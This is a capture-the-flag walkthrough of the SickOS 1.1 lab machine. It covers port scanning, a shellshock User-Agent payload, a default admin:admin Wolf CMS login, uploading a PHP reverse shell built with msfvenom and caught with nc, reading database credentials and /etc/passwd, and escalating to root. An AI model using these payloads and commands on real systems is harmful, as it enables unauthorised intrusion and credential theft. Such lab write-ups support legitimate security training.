# SickOS 1.1
![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`
![](https://i.imgur.com/vlJJGsG.png)
Victim is `192.168.227.133`
`nmap -sS -sV -A -p- -oN NmapSickOsLv1.txt 192.168.227.133`
![](https://i.imgur.com/k4H3slv.png)
Here we got two port open: OpenSSH 5.9p1/22, Squid http proxy 3.1.19/3128
![](https://i.imgur.com/917usUj.png)
Let's use the port:8080 web vul scanner to check the web with proxy.
`nikto -h 192.168.227.133 --useproxy http://192.168.227.133:3128`

![](https://i.imgur.com/ZXLfSRu.png)
There's `shellshock` vulnerability in this service, simply use exploit to get shell command exec.
https://community.tenable.com/s/question/0D5f200004rM1jUCAS/additional-shellshock-pattern-cve20146278-for-bashcve20146271rcenasl
Modified with burp-suite: 
```
User-Agent: () { _; } >_[$($())] { echo;echo; id;}
```
Let's try to see host with proxy first, there might still have   somewhere to be exploited.

![](https://i.imgur.com/zxVd4dq.png)
After setting proxy, browse the host.

![](https://i.imgur.com/DeCLoc6.png)
Nothing here, let's use the url the `Nikto` found: `/cgi.bin/status`
![](https://i.imgur.com/SjfFP0J.png)
Well, there's only some server's OS/kernel version info.
Let's use CTF skill to check the `robots.txt`

![](https://i.imgur.com/bpG4mY3.png)
Here we got the `/wolfcms`, which seem like a cms service.

![](https://i.imgur.com/1eQ4rUI.png)
Simply check every url, traditional cms might has a login panel for admin.

![](https://i.imgur.com/F3IsMTx.png)
![](https://i.imgur.com/ptpD0xB.png)
Seems that `/?` is a suspicious point to other page, maybe we can add `login`, `panel`, `admin` or something in wordlist after it.

![](https://i.imgur.com/8bHrU5K.png)
After we add `admin` after `/?`, we been redirected to `/?/admin/login` automatically.

Now, before we try the SQLi, test default/weak password first.
![](https://i.imgur.com/C9dudVo.png)
Actually, simple SQLi not works on this, but default AC/PW works, as `admin:admin`, we're in.

![](https://i.imgur.com/mfNHUW5.png)
Here we got a feature to upload the file, actually, every cms panel might has this feature, and this is what we want, to upload a reverse shell file.
Pentestmonkey always help:
https://github.com/pentestmonkey/php-reverse-shell

Or you can generate by yourself, use:
`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.227.132 LPORT=8888 R > SickOS11shell.php`

![](https://i.imgur.com/s28r7wQ.png)
Modified the payload before upload.

![](https://i.imgur.com/mSusJMK.png)
Fortunately, this upload system didn't check the file type with Content Security Policy (CSP) header, we don't need to add another proxy to modified the package.

![](https://i.imgur.com/x0a56cI.png)
After update, open terminal `nc -nvlp 8888`, then use browser to browse the page.

![](https://i.imgur.com/JITMSrl.png)
Wuth these, payload might exec, and listener might get shell.

According to nc reverse shell has limmit and some backwards, let change it into pty: `python -c 'import pty;pty.spawn("/bin/bash")'`
Reason might be found here: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

![](https://i.imgur.com/x691GPc.png)
Then we switch into `/var/www/wolfcms` to find the AC/PW.

![](https://i.imgur.com/kswwbdg.png)
Here we got the AC/PW in the database connect config.

![](https://i.imgur.com/SyEfwvv.png)
We use `root:john@123` to ssh, however, it doesn't work.

We cat `/etc/passwd` to see who super user is.
![](https://i.imgur.com/XuGtpqP.png)

![](https://i.imgur.com/I4uV54w.png)
Take another try on `sikOs:john@123`, fortunatelly, we in.

As a super user, we can `sudo su` to become a root with our own password.

Then check `/root` and cat the `flag.txt`
![](https://i.imgur.com/Edf9eS8.png)
